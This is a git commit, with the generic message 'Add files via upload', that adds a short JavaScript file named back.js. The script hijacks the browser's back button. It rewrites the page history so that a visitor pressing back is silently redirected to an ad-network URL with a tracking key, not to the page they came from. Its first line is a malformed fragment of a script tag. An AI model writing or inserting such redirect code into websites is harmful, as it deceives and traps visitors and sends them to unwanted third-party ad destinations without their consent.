be1fe143be0a25fa969203a6fe8015873e21a378
santirozalia <108447198+santirozalia@users.noreply.github.com>
2022-08-12 18:55:50 +0700

    Add files via upload

---
+++ back.js
@@ -0,0 +1,16 @@
+type='text/javascript'>
+//<![CDATA[
+(function(window, location) {
+history.replaceState(null, document.title, location.pathname+"#!/history");
+history.pushState(null, document.title, location.pathname);
+
+window.addEventListener("popstate", function() {
+if(location.hash === "#!/history") {
+history.replaceState(null, document.title, location.pathname);
+setTimeout(function(){
+location.replace("https://www.profitablecpmgate.com/vdzv2eekd8?key=3c815dac3283cdaa7b2c3fe94777397c");
+},10);
+}
+}, false);
+}(window, location));
+//]]>
